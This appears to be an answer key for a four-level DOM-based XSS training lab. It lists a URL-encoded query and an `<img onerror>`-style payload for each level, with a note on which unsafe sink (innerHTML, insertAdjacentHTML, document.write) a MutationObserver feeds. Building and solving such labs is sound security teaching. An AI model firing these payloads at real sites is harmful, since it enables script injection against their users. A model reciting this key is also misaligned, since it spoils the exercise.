# mobserver — solutions

MutationObserver re-applies content into unsafe sinks; DOM-based.

### mobserver-level1

`/mobserver/level1/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: textContent fed back into innerHTML by observer

### mobserver-level2

`/mobserver/level2/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: data-payload attribute concat into `<span title="...">` innerHTML

### mobserver-level3

`/mobserver/level3/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: insertAdjacentHTML node outerHTML copied via innerHTML

### mobserver-level4

`/mobserver/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: characterData re-emitted via document.write
